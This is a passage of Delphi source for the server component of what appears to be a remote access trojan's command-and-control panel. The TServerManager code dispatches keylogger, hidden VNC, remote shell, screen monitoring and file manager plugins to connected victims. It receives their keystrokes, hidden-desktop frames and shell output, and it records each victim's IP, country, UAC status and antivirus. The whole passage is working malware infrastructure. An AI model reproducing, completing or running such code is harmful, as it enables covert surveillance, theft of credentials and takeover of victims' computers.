        if LineEnd > 0 then
          Move(Buffer[0], LineBytes[0], LineEnd);
        ConsumeBytes(Buffer, LineEnd + 1);

        LineText := TEncoding.UTF8.GetString(LineBytes);
        if (LineText <> '') and (LineText[Length(LineText)] = #13) then
          Delete(LineText, Length(LineText), 1);

        if Trim(LineText) <> '' then
          Messages.Add(LineText);
      end;

      if Length(Buffer) > MAX_JSON_BUFFER_SIZE then
        SetLength(Buffer, 0);
      FReadBuffers.AddOrSetValue(aLine, Buffer);
    finally
      FLock.Leave;
    end;

    for LineText in Messages do
      ProcessJSONMessage(aLine, LineText);

    for BP in BinaryPackets do
    begin
      if BP.PacketType = PACKET_TYPE_MONITOR_FRAME then
        ProcessMonitoringBinaryFrame(aLine, BP.Payload)
      else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
        ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload)
      else if BP.PacketType = PACKET_TYPE_HIDDEN_VNC_FRAME then
        ProcessHiddenVNCBinaryFrame(aLine, BP.Payload);
    end;
  finally
    BinaryPackets.Free;
    Messages.Free;
  end;
end;

procedure TServerManager.ProcessMonitoringBinaryFrame(aLine: TncLine; const Payload: TBytes);
var
  FrameHeader   : TMonitorFramePayloadHeader;
  FrameBytes    : TBytes;
  HeaderSize    : Integer;
  MonitoringForm: TForm6;
begin
  HeaderSize := SizeOf(TMonitorFramePayloadHeader);
  if Length(Payload) < HeaderSize then
    Exit;

  Move(Payload[0], FrameHeader, HeaderSize);
  if FrameHeader.Format <> MONITOR_FRAME_FORMAT_JPEG then
    Exit;

  if (FrameHeader.DataSize = 0) or
     (Integer(FrameHeader.DataSize) <> (Length(Payload) - HeaderSize)) then
    Exit;

  SetLength(FrameBytes, FrameHeader.DataSize);
  Move(Payload[HeaderSize], FrameBytes[0], FrameHeader.DataSize);

  if Length(FrameBytes) = 0 then
    Exit;

  MonitoringForm := GetMonitoringForm(aLine);
  if Assigned(MonitoringForm) then
    MonitoringForm.QueueFrameBytes(FrameBytes);
end;

procedure TServerManager.ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
var
  FileManagerForm: TForm9;
begin
  FileManagerForm := GetFileManagerForm(aLine);
  if Assigned(FileManagerForm) then
  begin
    var CapturedPayload := Payload;
    QueueToUI(procedure
    begin
      FileManagerForm.HandleBinaryPacket(PacketType, CapturedPayload);
    end);
  end;
end;

procedure TServerManager.ProcessHiddenVNCBinaryFrame(aLine: TncLine; const Payload: TBytes);
var
  HiddenVNCForm: TForm10;
begin
  HiddenVNCForm := GetHiddenVNCForm(aLine);
  if Assigned(HiddenVNCForm) then
  begin
    var CapturedPayload := Payload;
    QueueToUI(procedure
    begin
      HiddenVNCForm.HandleBinaryPacket(PACKET_TYPE_HIDDEN_VNC_FRAME, CapturedPayload);
    end);
  end;
end;

procedure TServerManager.ProcessJSONMessage(aLine: TncLine; const RawStr: string);
var
  JSONVal : TJSONValue;
  JSONObj : TJSONObject;
  Info    : TClientInfo;
  Action  : string;
  PluginID: string;
  IP      : string;
begin
  JSONVal := TJSONObject.ParseJSONValue(RawStr);
  if not Assigned(JSONVal) then Exit;
  try
    if not (JSONVal is TJSONObject) then Exit;
    JSONObj := TJSONObject(JSONVal);

    Action := '';
    if Assigned(JSONObj.Values['action']) then
      Action := JSONObj.Values['action'].Value;

    IP := '';
    if TryGetClientInfo(aLine, Info) then
      IP := Info.IPAddress;

    if Action = 'pong' then
    begin
      FLock.Enter;
      try
        if FClients.TryGetValue(aLine, Info) then
        begin
          Info.LastPongTime := GetTickCount64;
          FClients.AddOrSetValue(aLine, Info);
        end;
      finally
        FLock.Leave;
      end;
      Exit;
    end;

    if Action = 'request_plugin' then
    begin
      PluginID := '';
      if Assigned(JSONObj.Values['id']) then
        PluginID := JSONObj.Values['id'].Value;

      if PluginID <> '' then
      begin
        DoLog(lcCommand, '"' + PluginID + '" requested by ' + IP);
        if SameText(PluginID, INFORMATION_PLUGIN_ID) then
          SendInformationPlugin(aLine)
        else if SameText(PluginID, PROCESS_MANAGER_PLUGIN_ID) then
          SendProcessManagerPlugin(aLine)
        else if SameText(PluginID, REMOTE_SHELL_PLUGIN_ID) then
          SendRemoteShellPlugin(aLine)
        else if SameText(PluginID, REMOTE_MONITORING_PLUGIN_ID) then
          SendRemoteMonitoringPlugin(aLine)
        else if SameText(PluginID, KEYLOGGER_PLUGIN_ID) then
          SendKeyloggerPlugin(aLine)
        else if SameText(PluginID, OPEN_URL_PLUGIN_ID) then
          SendOpenURLPlugin(aLine)
        else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID) then
          SendFileManagerPlugin(aLine)
        else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID) then
          SendHiddenVNCPlugin(aLine)
        else
          SendPlugin(aLine, PluginID);
      end;
      Exit;
    end;

    if (Action = 'hvnc_response') or (Action = 'hvnc_status') or (Action = 'hvnc_error') then
    begin
      DoLog(lcCommand, '"' + Action + '" received from ' + IP);
      if Assigned(FOnHiddenVNCReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnHiddenVNCReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if (Action = 'filemanager_response') then
    begin
      DoLog(lcCommand, '"filemanager_response" received from ' + IP);
      if Assigned(FOnFileManagerReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnFileManagerReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if Action = 'inforesponse' then
    begin
      DoLog(lcCommand, '"inforesponse" received from ' + IP);
      if Assigned(FOnInfoReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnInfoReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if Action = 'processresponse' then
    begin
      DoLog(lcCommand, '"processresponse" received from ' + IP);
      if Assigned(FOnProcessReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnProcessReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if Action = 'shellresponse' then
    begin
      DoLog(lcCommand, '"shellresponse" received from ' + IP);
      if Assigned(FOnRemoteShellReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnRemoteShellReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if (Action = 'monitorresponse') or (Action = 'monitorframe') or
       (Action = 'monitorstatus')   or (Action = 'monitorlistresponse') or
       (Action = 'monitorerror') then
    begin
      if not SameText(Action, 'monitorframe') then
        DoLog(lcCommand, '"' + Action + '" received from ' + IP);
      if Assigned(FOnMonitoringReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnMonitoringReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if (Action = 'keylogdata') then
    begin
      DoLog(lcCommand, '"' + Action + '" received from ' + IP);
      if Assigned(FOnKeyloggerReceived) then
      begin
        var JSONClone    := TJSONObject(JSONObj.Clone);
        var CapturedLine := aLine;
        var CB           := FOnKeyloggerReceived;
        QueueToUI(procedure
        begin
          try
            CB(CapturedLine, JSONClone);
          finally
            JSONClone.Free;
          end;
        end);
      end;
      Exit;
    end;

    if (Action = 'openurl_response') then
    begin
      var Status  := JSONObj.Values['status'].Value;
      var Message := '';
      if Assigned(JSONObj.Values['message']) then
        Message := ': ' + JSONObj.Values['message'].Value;

      if SameText(Status, 'success') then
        DoLog(lcCommand, '"openurl" success on ' + IP)
      else
        DoLog(lcError, '"openurl" failed on ' + IP + Message);
      Exit;
    end;

    if (Action <> '') and (Action <> 'ping') then
      DoLog(lcCommand, '"' + Action + '" received from ' + IP);

    FLock.Enter;
    try
      if FClients.TryGetValue(aLine, Info) then
      begin
        if Assigned(JSONObj.Values['ip'])        then Info.IPAddress   := JSONObj.Values['ip'].Value;
        if Assigned(JSONObj.Values['country'])   then Info.Country     := JSONObj.Values['country'].Value;
        if Assigned(JSONObj.Values['desktop'])   then Info.DesktopName := JSONObj.Values['desktop'].Value;
        if Assigned(JSONObj.Values['os'])        then Info.OS          := JSONObj.Values['os'].Value;
        if Assigned(JSONObj.Values['date'])      then Info.Date        := JSONObj.Values['date'].Value;
        if Assigned(JSONObj.Values['uac'])       then Info.UAC         := JSONObj.Values['uac'].Value;
        if Assigned(JSONObj.Values['antivirus']) then Info.AntiVirus   := JSONObj.Values['antivirus'].Value;
        FClients.AddOrSetValue(aLine, Info);
      end;
    finally
      FLock.Leave;
    end;

    if Assigned(FOnClientUpdated) then
    begin
      var CapturedInfo: TClientInfo;
      if TryGetClientInfo(aLine, CapturedInfo) then
      begin
        var CB := FOnClientUpdated;
        QueueToUI(procedure begin CB(CapturedInfo); end);
      end;
    end;
  finally
    JSONVal.Free;
  end;
end;

procedure TServerManager.OnHeartbeat(Sender: TObject);
var
  LinesToDisconnect: TList<TncLine>;
  LinesToPing      : TList<TncLine>;
  Pair             : TPair<TncLine, TClientInfo>;
  i                : Integer;
  Now              : UInt64;
begin
  if not FServer.Active then Exit;

  LinesToDisconnect := TList<TncLine>.Create;
  LinesToPing       := TList<TncLine>.Create;
  try
    Now := GetTickCount64;
    FLock.Enter;
    try
      for Pair in FClients do
      begin
        if (Now - Pair.Value.LastPongTime) > 25000 then
          LinesToDisconnect.Add(Pair.Key)
        else
          LinesToPing.Add(Pair.Key);
      end;
    finally
      FLock.Leave;
    end;

    for i := 0 to LinesToDisconnect.Count - 1 do
      DisconnectLine(LinesToDisconnect[i]);
    for i := 0 to LinesToPing.Count - 1 do
      SendPing(LinesToPing[i]);
  finally
    LinesToDisconnect.Free;
    LinesToPing.Free;
  end;
end;

procedure TServerManager.DisconnectLine(aLine: TncLine);
begin
  if not Assigned(aLine) then Exit;
  try
    Winapi.Winsock2.closesocket(aLine.Handle);
  except
  end;
end;

procedure TServerManager.SendPing(aLine: TncLine);
var
  PingObj: TJSONObject;
begin
  PingObj := TJSONObject.Create;
  try
    PingObj.AddPair('action', 'ping');
    SendJSON(aLine, PingObj);
  finally
    PingObj.Free;
  end;
end;

end.



